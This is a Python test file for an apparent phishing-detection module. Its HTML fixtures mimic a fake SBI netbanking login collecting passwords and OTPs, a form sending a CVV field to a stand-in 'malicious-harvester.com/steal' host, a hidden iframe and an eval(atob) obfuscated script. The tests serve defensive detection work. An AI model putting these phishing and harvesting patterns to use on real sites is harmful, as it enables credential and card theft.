from app.analyzers.website_checks import inspect_html_elements

def test_fake_brand_password_form_detected():
    html = (
        "<html><head><title>SBI Online NetBanking Login</title></head>"
        "<body><h1>State Bank of India Secure Portal</h1>"
        "<form action='/login' method='post'>"
        "<input type='text' name='username'>"
        "<input type='password' name='password'>"
        "<input type='text' name='otp' placeholder='Enter OTP'>"
        "<button type='submit'>Login</button></form></body></html>"
    )
    signals, text = inspect_html_elements(html, "http://sbi-secure-portal.xyz/login")
    signal_ids = [s.id for s in signals]
    assert "website_title_brand_mismatch" in signal_ids
    assert "website_password_brand_mismatch" in signal_ids
    assert "website_sensitive_inputs" in signal_ids

def test_form_posts_to_external_domain():
    html = (
        "<html><head><title>Account Service</title></head>"
        "<body><form action='http://malicious-harvester.com/steal' method='post'>"
        "<input type='text' name='cvv'></form></body></html>"
    )
    signals, text = inspect_html_elements(html, "http://legit-looking-service.net")
    signal_ids = [s.id for s in signals]
    assert "website_form_cross_domain" in signal_ids
    assert "website_sensitive_inputs" in signal_ids

def test_hidden_iframe_detected():
    html = "<html><body><iframe src='http://hidden-payload.net' style='display:none'></iframe></body></html>"
    signals, text = inspect_html_elements(html, "http://example.com")
    signal_ids = [s.id for s in signals]
    assert "website_hidden_iframe" in signal_ids

def test_obfuscated_script_detected():
    html = "<html><body><script>eval(atob('YWxlcnQoMSk='));</script></body></html>"
    signals, text = inspect_html_elements(html, "http://example.com")
    signal_ids = [s.id for s in signals]
    assert "website_obfuscated_js" in signal_ids
